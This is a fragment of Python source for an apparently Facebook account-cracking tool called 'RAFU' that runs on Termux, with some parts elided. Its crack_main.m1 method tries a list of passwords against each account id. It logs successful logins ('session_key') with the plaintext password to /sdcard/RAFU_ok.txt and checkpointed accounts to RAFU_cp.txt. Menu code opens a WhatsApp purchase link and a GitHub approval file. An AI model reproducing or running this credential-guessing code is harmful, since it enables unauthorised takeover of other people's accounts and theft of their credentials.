...
def qsbuy():
	try:
		...
		try:
			...
			os.system(f"termux-open-url https://wa.me/+8801982876336?text={bumper}")
			qsbuy()
...
def main():
	...
	if menu_opt =='1':
		...
		xchker()
		os.system('xdg-open https://github.com/Rafu0878/anotherapproval.txt.git')
		main()
	elif menu_opt =='4':
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[RAFU] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[RAFU-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/RAFU_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[RAFU-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/RAFU_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/RAFU_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
